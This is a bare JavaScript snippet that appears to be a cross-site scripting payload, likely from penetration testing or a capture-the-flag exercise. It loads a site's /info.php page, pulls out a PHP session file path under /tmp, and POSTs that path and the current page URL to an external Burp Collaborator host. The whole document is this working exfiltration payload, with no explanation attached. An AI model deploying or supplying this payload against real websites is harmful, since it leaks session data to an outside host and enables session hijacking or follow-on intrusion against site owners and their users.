fetch('/info.php')
  .then(res => res.text())
  .then(html => {
    const match = html.match(/\/tmp\/sess_[a-z0-9]+/i);
    if (match) {
      fetch('http://fgzunm5n611wi4mxicfampzfa6gy4n.burpcollaborator.net', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionFile: match[0], url: location.href })
      });
    }
  });
